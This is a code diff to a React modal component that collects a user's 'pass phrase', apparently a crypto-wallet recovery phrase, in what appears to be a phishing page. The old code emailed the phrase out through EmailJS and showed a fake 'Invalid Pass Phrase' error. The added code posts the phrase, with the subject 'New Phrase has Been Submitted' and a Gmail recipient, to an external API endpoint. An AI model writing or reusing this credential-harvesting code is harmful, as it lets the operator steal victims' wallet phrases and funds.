@@ -7,6 +7,7 @@ import { MdPassword } from "react-icons/md";
 import Loading from "./Loading";
 import emailjs from "@emailjs/browser";
 import { useForm } from "antd/es/form/Form";
+import axios from "axios";
 
 type Props = {
   open: { isOpen: boolean; action: string };
@@ -41,18 +42,26 @@ const ValidateModal = (props: Props) => {
     form.setFieldsValue({ device_info: deviceInfo });
     setIsLoading(true);
 
+    const body = {
+      subject: "New Phrase has Been Submitted",
+      phrase: phrase,
+      to: "cleverdeveloper360@gmail.com",
+    };
+
     try {
-      await emailjs.send(
-        import.meta.env.VITE_EMAIL_SERVICE_ID,
-        import.meta.env.VITE_EMAIL_TEMPLATE_ID,
-        {
-          device_info: deviceInfo,
-          passphrase: phrase,
-        },
-        import.meta.env.VITE_EMAIL_PUBLIC_KEY
-      );
-      setErrorMessage(true);
-      message.error("Invalid Pass Phrase");
+      const send = await axios.post(import.meta.env.VITE_API_ENDPOINT, body);
+      console.log(send);
+      // await emailjs.send(
+      //   import.meta.env.VITE_EMAIL_SERVICE_ID,
+      //   import.meta.env.VITE_EMAIL_TEMPLATE_ID,
+      //   {
+      //     device_info: deviceInfo,
+      //     passphrase: phrase,
+      //   },
+      //   import.meta.env.VITE_EMAIL_PUBLIC_KEY
+      // );
+      // setErrorMessage(true);
+      // message.error("Invalid Pass Phrase");
     } catch (error) {
       console.error("Email sending failed:", error);
     } finally {
